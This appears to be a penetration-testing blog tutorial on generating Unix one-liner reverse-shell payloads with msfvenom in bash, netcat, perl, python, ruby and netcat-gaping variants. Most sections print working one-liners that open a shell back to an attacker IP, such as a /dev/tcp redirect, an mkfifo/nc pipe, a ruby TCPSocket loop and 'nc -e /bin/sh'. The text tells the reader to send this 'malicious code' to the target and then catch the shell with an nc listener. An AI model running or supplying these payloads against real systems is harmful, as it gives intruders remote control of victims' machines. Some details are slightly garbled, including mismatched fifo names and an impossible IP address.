<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Generating Reverse Shell using Msfvenom (One Liner Payload)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/" rel="bookmark"><time class="entry-date published" datetime="2018-03-08T17:27:08+00:00">March 8, 2018</time><time class="updated" datetime="2025-05-27T12:03:21+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today you will learn how to spawn a TTY reverse shell through netcat by using single line payload which is also known as stagers exploit that comes in Metasploit.</span></p>
<p><span style="color: #000000;">Basically, there are two types of terminal TTYs and PTs. <strong>TTYs</strong> are Linux/Unix shell which is hardwired terminal on a serial connection connected to mouse or keyboard and<strong> PTs </strong>is sudo tty terminal, to get the copy of terminals on network connections via SSH or telnet.</span></p>
<p><span style="color: #000000;"><strong>Let’s start!!</strong></span></p>
<p><span style="color: #000000;"><strong>Attacker: Kali Linux</strong></span></p>
<p><span style="color: #000000;"><strong>Target: Ubuntu</strong></span></p>
<p><span style="color: #000000;">Open the terminal in your Kali Linux and <strong>type msfconsole</strong> to load Metasploit framework, now search all one-liner payloads for UNIX system using <strong>search command</strong> as given below, it will dump all exploit that can be used to compromise any UNIX system.</span></p>
<pre class="lang:default decode:true">search cmd/unix</pre>
<p><span style="color: #000000;">From given below image you can observe that it has dumped all exploit that can be used to be compromised any UNIX system. In this tutorial, we are going to use some of the payloads to spawn a TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-r43-sG2DkCU/WqFiAwLUSyI/AAAAAAAAVIM/P5nw7lj-mqQPt6t2JfbCoMdUgaYhthG8QCEwYBhgL/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Bash Shell</strong></span></h3>
<p><span style="color: #000000;">In order to compromise a bash shell, you can use <strong>reverse_bash </strong> payload along msfvenom as given in below command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R</pre>
<p><span style="color: #000000;"> Here we had entered the following detail to generate one-liner raw payload.</span></p>
<p><span style="color: #000000;"><strong>-p:</strong> type of payload you are using i.e. cmd/unix/reverse_bash</span></p>
<p><span style="color: #000000;"><strong>lhost</strong>: listening IP address i.e. Kali Linux IP</span></p>
<p><span style="color: #000000;"><strong>lport:</strong> Listening port number i.e. 1111 (any random port number which is not utilized by other services)</span></p>
<p><span style="color: #000000;"><strong>R:</strong> Its stand for raw payload</span></p>
<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 67 bytes, now copy this malicious code and send it to target. After that start netcat for accessing reverse connection and wait for getting his TTy shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KJxz5G4Jros/WqFiEUoMV_I/AAAAAAAAVIA/UOQTMVBJzCAFmQJscPqCtnY712Ey1KhUQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">For example when the target will open </span></p>
<pre class="lang:default decode:true">0&lt;&amp;121-;exec 121&lt;&gt;/dev/tcp/192.168.1.103/1111;sh &lt;&amp;121 &gt;&amp;121 2&gt;&amp;121&gt;</pre>
<p><span style="color: #000000;">malicious code in terminal, the attacker will get a reverse shell through netcat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aOrDZxwm1Fc/WqFiEhqFelI/AAAAAAAAVH8/25EYiUlBJ2sk6dA4oVL79atWHRESVQ95wCEwYBhgL/s1600/3.png"/></span></p>
<pre class="lang:default decode:true">nc -lvp 1111</pre>
<p><span style="color: #000000;">As you can observe the result from given below image where the attacker has successfully accomplish targets system TTY shell, now he can do whatever he wishes to do.</span></p>
<p><span style="color: #000000;">For example:</span></p>
<p><span style="color: #000000;"><strong>whoami:</strong> it tells you are the root user of the system you have compromised.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X249ZWj2ODk/WqFiE7Zu96I/AAAAAAAAVIA/ZusM4IS97foEKq118Amq-JvorostfOarACEwYBhgL/s1600/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Netcat Shell</strong></span></h3>
<p><span style="color: #000000;">In order to compromise a netcat shell, you can use <strong>reverse_netcat</strong> payload along msfvenom as given in below command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.103 lport=2222 R</pre>
<p><span style="color: #000000;"> Here we had entered the following detail to generate one-liner raw payload.</span></p>
<p><span style="color: #000000;"><strong>-p:</strong> type of payload you are using i.e. cmd/unix/reverse_netcat</span></p>
<p><span style="color: #000000;"><strong>lhost</strong>: listening IP address i.e. Kali Linux IP</span></p>
<p><span style="color: #000000;"><strong>lport:</strong> Listening port number i.e. 2222 (any random port number which is not utilized by other services)</span></p>
<p><span style="color: #000000;"><strong>R:</strong> Its stand for raw payload</span></p>
<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 104 bytes, now copy this malicious code and send it to target. After that start netcat for accessing reverse connection and wait for getting his TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dRhs-m_sDTw/WqFiFXi571I/AAAAAAAAVIA/7nZznadxKL4edfsJsP8m5xKiqLYLYVPdQCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">when the target will open </span></p>
<pre class="lang:default decode:true">mkfifo /tmp/admoszx; nc 192.168.1.103 2222 0&lt;/tmp/admsozx | /bin/sh &gt;/tmp/admson 2&gt;&amp;1; rm /tmp/admoszx )</pre>
<p><span style="color: #000000;">malicious code in terminal, the attacker will get a reverse shell through netcat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MzM0Kc42WfA/WqFiFf-7ghI/AAAAAAAAVIE/88RVV1bXVokuGhgyexCP7jukvEfKa020gCEwYBhgL/s1600/6.png"/></span></p>
<pre class="lang:default decode:true">nc -lvp 2222</pre>
<p><span style="color: #000000;">As you can observe the result from given below image where the attacker has successfully accomplish targets system TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_PXO_iusdi0/WqFiFvsu5aI/AAAAAAAAVIE/E6CaG-RtyBowhn2m6rWQjGIWlSMq-ZMhwCEwYBhgL/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Perl shell</strong></span></h3>
<p><span style="color: #000000;">In order to compromise a Perl shell, you can use <strong>reverse_perl</strong> payload along msfvenom as given in below command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.103 lport=3333 R</pre>
<p><span style="color: #000000;"> Here we had entered the following detail to generate one-liner raw payload.</span></p>
<p><span style="color: #000000;"><strong>-p:</strong> type of payload you are using i.e. cmd/unix/reverse_perl</span></p>
<p><span style="color: #000000;"><strong>lhost</strong>: listening IP address i.e. Kali Linux IP</span></p>
<p><span style="color: #000000;"><strong>lport:</strong> Listening port number i.e. 3333 (any random port number which is not utilized by other services)</span></p>
<p><span style="color: #000000;"><strong>R:</strong> Its stand for raw payload</span></p>
<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 232 bytes, now copy this malicious code and send it to target. After that start netcat for accessing reverse connection and wait for getting his TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-jVEp1bqqTBA/WqFiGOory3I/AAAAAAAAVII/6q-AdV1NocwicZdaLMy8_-V55l6Qj0UkACEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now again when the target will open malicious code in terminal, the attacker will get a reverse shell through netcat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Tx7Q1nlapUU/WqFiGWk-nMI/AAAAAAAAVIM/MeVSv3xHmRo9P7wWi9qRaEmUm9c6409_wCEwYBhgL/s1600/9.png"/></span></p>
<pre class="lang:default decode:true">nc -lvp 3333</pre>
<p><span style="color: #000000;">As you can observe the result from given below image where the attacker has successfully accomplish targets system TTY shell. Here we found target IP address: 192.168.1.1106 by executing the <strong>ifconfig </strong>command in his TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xYhkVr5O8FE/WqFiBOpXCuI/AAAAAAAAVH8/f_imTPxriGMxhilqVVkaP-ab7SFAD5IMgCEwYBhgL/s1600/10.png"/></span></p>
<h3><span style="color: #800000;"><strong>Python Shell</strong></span></h3>
<p><span style="color: #000000;">In order to compromise a python shell, you can use <strong>reverse_Python</strong> payload along msfvenom as given in below command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.1.103 lport=4444 R</pre>
<p><span style="color: #000000;"> Here we had entered the following detail to generate one-liner raw payload.</span></p>
<p><span style="color: #000000;"><strong>-p:</strong> type of payload you are using i.e. cmd/unix/reverse_python</span></p>
<p><span style="color: #000000;"><strong>lhost</strong>: listening IP address i.e. Kali Linux IP</span></p>
<p><span style="color: #000000;"><strong>lport:</strong> Listening port number i.e. 4444 (any random port number which is not utilized by other services)</span></p>
<p><span style="color: #000000;"><strong>R:</strong> Its stand for raw payload</span></p>
<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 533 bytes, now copy this malicious code and send it to target. After that start netcat for accessing reverse connection and wait for getting his TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kJgFCi6b8zs/WqFiA4SiFeI/AAAAAAAAVIA/UEMY45zt5LAPPmjtCxTq2QmYYkDbaVJigCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Again when the target will open the following malicious code in his terminal, the attacker will get the reverse shell through netcat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nP5R4I_0wC4/WqFiCN0i5DI/AAAAAAAAVIM/40_iD6OO0eQGA4lmbCyhMsUOL-C2p3XygCEwYBhgL/s1600/12.png"/></span></p>
<pre class="lang:default decode:true">nc -lvp 4444</pre>
<p><span style="color: #000000;">As you can observe the result from given below image where the attacker has successfully accomplish targets system TTY shell, now he can do whatever he wishes to do.</span></p>
<p><span style="color: #000000;">For example:</span></p>
<p><span style="color: #000000;"><strong>ifconfig:</strong> it tells IP configuration of the system you have compromised.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EeQA_8HfqOA/WqFiCoMsWTI/AAAAAAAAVH8/3DG1mkfxTDMBWchZH4-dLWHf4IpLDguuwCEwYBhgL/s1600/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>Ruby Shell</strong></span></h3>
<p><span style="color: #000000;">In order to compromise a ruby shell, you can use <strong>reverse_ruby</strong> payload along msfvenom as given in below command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_ruby lhost=192.168.1.103 lport=5555 R</pre>
<p><span style="color: #000000;"> Here we had entered the following detail to generate one-liner raw payload.</span></p>
<p><span style="color: #000000;"><strong>-p:</strong> type of payload you are using i.e. cmd/unix/reverse_ruby</span></p>
<p><span style="color: #000000;"><strong>lhost</strong>: listening IP address i.e. Kali Linux IP</span></p>
<p><span style="color: #000000;"><strong>lport:</strong> Listening port number i.e. 5555 (any random port number which is not utilized by other services)</span></p>
<p><span style="color: #000000;"><strong>R:</strong> Its stand for raw payload</span></p>
<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 131 bytes, now copy this malicious code and send it to target. After that start netcat for accessing reverse connection and wait for getting his TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5N5-vl4UFhQ/WqFiCtFYm8I/AAAAAAAAVIE/RN811uJgwT4kM_0U8cRyMbw2TmRydgwsQCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Again when the target will open </span></p>
<pre class="lang:default decode:true">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.103","5555");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
<p><span style="color: #000000;">malicious code in his terminal, the attacker will get a reverse shell through netcat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-08C4U6-tul4/WqFiC8r9Q-I/AAAAAAAAVH8/35lNvpYZ58c3vDgMp34FA9tFoKngeSZ3ACEwYBhgL/s1600/15.png"/></span></p>
<pre class="lang:default decode:true">nc -lvp 5555</pre>
<p><span style="color: #000000;">As you can observe the result from given below image where the attacker has successfully accomplish targets system TTY shell, now he can do whatever he wishes to do.</span></p>
<p><span style="color: #000000;">For example:</span></p>
<p><span style="color: #000000;"><strong>ifconfig:</strong> it tells IP configuration of the system you have compromised.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YSbNbBCXmPM/WqFiDPt-eLI/AAAAAAAAVII/HtzWsyyc0kUZ7jabkRnbJGvX8rE-1Qk8ACEwYBhgL/s1600/16.png"/></span></p>
<h3><span style="color: #800000;"><strong>Netcat Gaping (Traditional)</strong></span></h3>
<p><span style="color: #000000;">In order to compromise a command shell, you can use <strong>reverse_netcat_gaping</strong> payload along msfvenom as given in below command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.103 lport=6666 R</pre>
<p><span style="color: #000000;"> Here we had entered the following detail to generate one-liner raw payload.</span></p>
<p><span style="color: #000000;"><strong>-p:</strong> type of payload you are using i.e. cmd/unix/reverse_netcat_gaping</span></p>
<p><span style="color: #000000;"><strong>lhost</strong>: listening IP address i.e. Kali Linux IP</span></p>
<p><span style="color: #000000;"><strong>lport:</strong> Listening port number i.e. 6666 (any random port number which is not utilized by other services)</span></p>
<p><span style="color: #000000;"><strong>R:</strong> Its stand for raw payload</span></p>
<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 533 bytes, now copy this malicious code and send it to target. After that start netcat for accessing reverse connection and wait for getting his TTY shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cjhqN_QUoJk/WqFiDSLojAI/AAAAAAAAVIE/HMTM12nRgM4MvJ7Z6ABD925bEWBNouyTwCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">In order to access /bin/sh shell of the target system for compromising TTY shell firstly, we had access PTs terminal  of the target through SSH and then paste the malicious code </span></p>
<pre class="lang:default decode:true">nc 192.168.1.103 6666 -e /bin/sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-n4tJjFsx4TE/WqFiDyHhPcI/AAAAAAAAVIA/5bL68qW0E6w3VYQppmOnTzIdDIDbP5lwQCEwYBhgL/s1600/18.png"/></span></p>
<pre class="lang:default decode:true ">nc -lvp 6666</pre>
<p><span style="color: #000000;">From given below image you can observe that we had successfully access TTY shell of the target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-vWNiioiTgXM/WqFiEJYTPKI/AAAAAAAAVII/RGaITQ7Jl2wMWxPGa4JPLsBFaBLJDA9GACEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
